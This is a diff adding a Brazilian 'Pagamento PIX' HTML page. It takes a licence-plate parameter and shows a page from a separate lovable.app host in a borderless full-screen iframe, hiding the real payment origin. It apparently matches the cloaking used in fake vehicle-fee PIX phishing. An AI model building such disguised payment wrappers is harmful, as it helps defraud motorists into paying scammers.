@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Pagamento PIX</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body,html{width:100%;height:100%;overflow:hidden}
+iframe{width:100%;height:100%;border:none}
+</style>
+</head>
+<body>
+<script>
+var params = new URLSearchParams(window.location.search);
+var placa = params.get('placa') || '';
+var src = 'https://warm-link-spark.lovable.app/pix?placa=' + encodeURIComponent(placa);
+document.write('<iframe src="' + src + '" allowfullscreen></iframe>');
+</script>
+</body>
+</html>
